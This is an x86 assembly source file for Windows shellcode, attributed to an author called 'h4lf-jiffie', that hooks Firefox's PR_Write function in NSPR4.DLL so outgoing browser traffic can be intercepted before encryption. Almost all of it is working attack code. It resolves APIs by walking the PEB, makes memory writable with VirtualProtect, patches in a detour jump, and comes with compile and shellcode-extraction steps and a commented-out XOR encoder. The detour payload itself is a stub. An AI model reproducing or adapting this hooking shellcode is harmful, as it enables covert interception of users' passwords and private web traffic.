; +++[ firefighter.asm by h4lf-jiffie (dohmatob elvis dopgima): win32 firefox post-encryption traffic sniffer ]+++
; Tested OK on 7 and xp

; /!\ This is for educationally purposed, ripped straight out of my daily ramblings. But that's besides the point ..

; HOWTO:
;    0]-- Compile with 'nasm -f bin -o firefighter.bin firefighter.asm'
;    1]-- Use some opcode wizard to extract the generated shellcode. I use PYHTON.
;         Viz, 'shellcode = open("firefighter.bin", "rb").read()'. You have the fire!

; XXX TODO: Use API name hashes instead of strings (les opcodes seront plus discr�t et moins lourd!)
; XXX TODO: Question-4-Answer: Shouldn't we suspend all other threads before hooking anything
;           (at least all those threads whose EIP lie within the bytes being patched)?

; 4CKNOWLEDGEMENT5:
; 0]-- http://www.projectshellcode.com
; 1]-- HARMONY SECURITY (http://blog.harmonysecurity.com/2009_06_01_archive.html)
; 2]-- http://www.infond.fr/2009/09/tutoriel-initiation-aux-shellcodes.html      
; 3]-- phr4ck Issue 0x3e by sk <sk at scan-associates d0t net>

[SECTION .text]

; set the code to be 32-bit
; Tip: If you don't have this line in more complex shellcode,
;    the resulting instructions may end up being different to
;    what you were expecting.
BITS 32

global _start
    
_start:
    jmp         entry_point
 
;crypto:
;    fldz
;    fnstenv [esp-0xC]
;    pop eax
;    add al, 10
;    nop
;    add eax,(entry_point - crypto - 0xA)    ; PROOF. It holds that @entry_point = @here + (@entry_point - @here)
;                                            ; && @entry_point - @here = (@entry_point - @crypto) - (@here - @crypto)
;                                            ; && @here = eax.  
;                                            ; But olldbg tells me: @here - @crypto = 10 bytes.
;                                            ; Thus, @entry_point = eax + (@entry_point - @crypto) - 0xA = 
;                                            ; eax + (@entry_point - J) - (@crypto - J) - 0xA, for all J.
;                                            ; Q.E.D.
;                                             
;    mov esi,eax                 ; esi = @entry_point
;    mov edi, esi
;    xor ecx,ecx
;    mov ecx,(zthe_end - entry_point) ; size of code to encode/decode
;    
;loop1:
;    lodsb 
;    xor 	al, 96h         ; 0x96 is the key
;    stosb
;    loop 	loop1
    
entry_point:
    xor         eax,eax
    xor         ebx,ebx 
    xor         ecx,ecx
    xor         esi,esi
    xor         edi,edi
				; we've cleared the general purpose registers
    jmp         get_kernel32
    
get_kernel32:
    mov         edx,[fs:0x30]	; get a pointer to the PEB
    mov         edx,[edx + 0x0C]; get PEB->Ldr
    mov         edx,[edx + 0x14]; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov         edx,[edx]       ; get the next entry (2nd entry)
    mov         edx,[edx]	; get the next entry (3rd entry)
    mov         edx,[edx + 0x10]; get the 3rd entries base address (kernel32.dll)
    
get_export_directory_table:
    mov         ebx,[edx + 0x3c]; ebx = offset of PE signature in kernel32.dll
    mov         ebx,[edx + ebx + 0x78]
				; ebx = offset of Export Directory Table in kernel32.dll
    add         ebx,edx         ; ebx = adress of Export Directory Table
    
get_GetProcAddress_address:
    mov         ecx,[ebx+0x18]  ; ecx = nb of exported APIs (counter)
    mov         eax,[ebx+0x20]  ; eax = offset of Export Name Pointer Table in kernel2.dll
    add         eax,edx         ; eax = address of Export Name Pointer Table
	
find_GetProcAddress:
    call        get_address_of_GetProcAddress
    pop         edi             ; edi = address of 'GetProcAddress' string
    dec         ecx             ; we'll index the APIs in reverse order; start from highest index
    mov         esi,[eax+ecx*4] ; esi = ordinal of 'APIName\n' in Name Pointer Table
    add         esi,edx         ; esi = adress of 'APIName\n' in Name Pointer Table
    push        ecx             ; store
    xor         ecx,ecx
    add         cl,14           ; ecx = length of "GetProcAddress" string
    repe        cmpsb           ; compare the strings pointed to by edi and esi
    pop         ecx             ; restore: ecx = nb exported APIs
    jnz         find_GetProcAddress
    mov         eax, [ebx+0x24] ; eax = offset Ordinal Table in kernel32.dll
    add         eax,edx         ; eax = adresse Ordinal Table
    mov         cx, [eax+ecx*2] ; cx = API ordinal - first ordinal
    mov         ax,[ebx+0x10]   ; eax = first ordinal in the table table
    add         cx,ax           ; cx = ordinal de la API
    dec         cx              ; to fall just in-phase (ordinal starts at 0)
    mov         eax,[ebx+0x1c]  ; eax = offset Export Address Table
    add         eax,edx         ; eax = adress of Export Address Table
    mov         eax,[eax+ecx*4] ; eax = offset of GetProcAddress kernel32.dll
    add         eax,edx 	; eax = adress of GetProcAddress API
    call        get_address_of_GetProcAddress
    pop         edi             ; edi = address of 'GetProcAddress' string
    stosd			; save back to source address!
    
real_business_begins:
    call        get_address_of_useful_kernel32dll_APIs
    
load_useful_kernel32dll_APIs:
    pop 	esi	        ; esi now points to the NULL-seperated list/table of APIs we'll be loading from kernel32.dll
    call	load_APIs	
				; XXX Do error-checks here!
    jmp         get_address_of_nspr4dll_path

grab_nspr4dll_handle:
    pop		ecx 		; address of NSPR4.DLL path
    push 	ecx
    call	get_address_of_useful_kernel32dll_APIs
    pop		edi
    call 	[edi+0x4*3]; GetModuleHandleA(dll path address)
    
after_grab_nspr4dll_handle:
    test        eax,eax
    jz          error           ; NSPR4.DLL not yet loaded or process is not FIREFOX !
    mov         edx,eax
    call        get_address_of_target_nspr4dll_APIs

load_target_nspr4dll_APIs: 
    pop 	esi	        ; esi now points to the NULL-seperated list/table of APIs we'll be loading from NSPR4.DLL
    call	load_APIs
				; XXX Do error-checks here!
    
hook_stuff_from_nspr4:
    call        get_address_of_PR_Write_detour_trampoline
    pop         edx		; edx now contains (run-time) address of PR_Write_detour_trampoline	
	
set_offset_for_PR_Write_detour_trampoline:
    mov         edi, edx
    add         edi,0x1		; edi  = address of "\xDE\xAD\xBE\xEF" string in PR_Write_detour_trampoline
    call	get_address_of_target_nspr4dll_APIs
    pop		eax
				
    mov         ecx,[eax]     	; ecx now contains address of PR_Write API
    add         ecx,0x6         ; <- 6 bytes ahead; untampered bytes of the API start here
    xor         eax,eax
    sub         ecx,edi
    add         ecx,0x1         ; weird correction!
    sub         ecx,0x5         ; 5-byte correction (size of jump instruction in PR_Write_detour_trampoline)
    mov         eax,ecx   
    stosd

after_set_offset_for_PR_Write_detour_trampoline:
    call	get_address_of_target_nspr4dll_APIs
    pop		eax
    mov         eax,[eax]       ; eax now contains address of PR_Write API
    
tweak_PR_Write_memory_access_rights:
    push        esi             ; would-be pointer to current access right (useful if we wish to restore it later)
    push        0x40            ; PAGE_EXECUTE_READWRITE
    push        0x6             ; size
    push        eax             ; address of PR_Write
    call	get_address_of_useful_kernel32dll_APIs
    pop		edi
    call        [edi+0x4]    	; VirtualProtect(address of PR_Write, 0x6, PAGE_EXECUTE_READWRITE, esi)
    
after_tweak_PR_Write_memory_access_rights:
				; error-checks follow
    test        eax,eax
    jz          error           ; Oops! It's no good to continue!
   
install_PR_Write_detour:
    call        get_address_of_PR_Write_detour
    pop         edx				; edx now contains (run-time) address of PR_Write_detour
    call	get_address_of_target_nspr4dll_APIs
    pop		eax
    mov         edi,[eax]   	; edi = address of PR_Write API
    xor         eax,eax         ; clear, we are parano
    mov         al, 0x90
    stosb                       ; write NOP to address of PR_Write
    mov         al, 0xE9
    stosb                       ; write \xE9 to address of PR_Write, + 1
    xor         eax,eax
    mov         eax,edx
    sub         eax,edi
    add         eax,0x1         ; <- weird correction!
    sub         eax,0x5         ; correction for jmp instruction itself
				; now eax = address of PR_Write_detour - (address of PR_Write + 1) - 5
    stosd                       ; write eax to address of PR_Write + 2
				; the patch is now 90 E9 DEADBEEF
						     
restore_PR_Write_memory_access_rights:
    call	get_address_of_target_nspr4dll_APIs
    pop		eax
    mov         eax,[eax]   	; eax now contains address of PR_Write
    mov         edx,[esi]       ; edx now contains previous PR_Write memory access rights
    push        esi             
    push        edx
    push        0x6             ; size
    push        eax             ; address of PR_Write
    call	get_address_of_useful_kernel32dll_APIs
    pop		edi
    call        [edi+0x4]    	; VirtualProtect(address of PR_Write, 0x6, PAGE_EXECUTE_READWRITE, esi)
    jmp quit

get_address_of_PR_Write_detour_trampoline:
    pop         eax
    call        eax
	
PR_Write_detour_trampoline:
    db 0xE9
				; The following double-word will be corrected according by
				; set_offset_for_PR_Write_detour_trampoline
    db 0xDE
    db 0xAD
    db 0xBE
    db 0xEF
 
get_address_of_PR_Write_detour:
    pop         eax
    call        eax
    
PR_Write_detour:
    nop                         ; This is just a stub. We own outgoing pre-encryption firefox traffic!
    
PR_Write_patched_bytes:
    MOV         EAX,[ESP+4]
    MOV         ECX,[EAX]
    
resume_PR_Write:
    jmp         PR_Write_detour_trampoline 
    
load_APIs:
				; @description: loads a bunch of APIs from a DLL
                                ; Here, I expect:
                                ; 0]-- edx set to the address of the DLL from which we'll load the APIs
                                ; 1]-- esi pointing to the NULL-seperated list/table of to-be-loaded APIs
    push	esi	        ; save
    call        get_address_of_GetProcAddress
    pop         edi 
    pop		esi		; restore
    mov		ebx,[edi]	; ebx  = address of GetProcAddress API   
    mov         edi,esi	        ; Assuming no API name is less than 4 bytes long (this is reasonable), we'll 
				; progressively override the said table of API names (pointed-to by esi) with 
				; addresses of the the loaded APIs. BTW, we won't be needing these names in future!
    
load_next_API:
				; loop until zero-byte (new table entry marker) found
    lodsb
    test	al,al
    jnz         load_next_API

check_end_of_API_table:
    lodsb
    dec		esi 		; fix-up
    test	al,al
    jz 		load_APIs_end	

continue_load_next_API:
    push	ebx  		; save
    push 	edx		; save
    push	esi  
    push	edx  		; DLL address
    ; int3
    call	ebx  		; GetProcAddress(DLL address, API_Name)
    ; int3			; uncomment this INT3 and inspect eax in a debugger (ollydbg?) if u will
    pop         edx		; restore 
    pop	        ebx		; restore   
    stosd			; write the output to EDI
    add         esi,0x3         ; substract strlen of shortest API name - 1
    jmp		load_next_API	

load_APIs_end:
    ret				; j ==> [edi - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the loaded APIs
    
error:
				; this is just a stub
    call        get_address_of_useful_kernel32dll_APIs
    pop         edi
    call        [edi]           ; GetLastError()
    jmp		quit
   
quit:
    call        get_address_of_useful_kernel32dll_APIs
    pop         edi
    push 	0x0
    call	[edi+0x4*5]	; ExitThread(0x0)	
    
get_address_of_GetProcAddress:
    pop		esi
    call        esi
    db 'GetProcAddress'
    db 0x0
    
get_address_of_useful_kernel32dll_APIs:
    pop         esi             
    call        esi     
    db 0x0 			; <- marks beginning of next table entr
    db "GetLastError"
    db 0x0
    db "VirtualProtect"
    db 0x0
    db "FreeLibraryAndExitThread"
    db 0x0
    db "GetModuleHandleA"
    db 0x0
    db "LoadLibraryA"
    db 0x0
    db "ExitThread"
    db 0x0
    db "WinExec"
    db 0x0
				; <- add other API (NULL-seperated!) names here if you will
    db 0x0                      ; <- marks end of this table 
    
get_address_of_nspr4dll_path:
    call        grab_nspr4dll_handle
    db "NSPR4.DLL"
    db 0x0
    
get_address_of_target_nspr4dll_APIs:
    pop         esi             ; esi = return address
    call        esi       
				; The above call will push the address of the following table, and then jump to the
				; instruction just after the caller -- the return address.
    db 0x0 		        ; <- marks beginning of next table entry
				; <- add other API (NULL-seperated!) names here if you will
    db "PR_Write"
    db 0x0
    db 0x0                      ; <- marks end of table
    
zthe_end:

; (c) h4lf-jiffie (gmdopp@gmail.com)




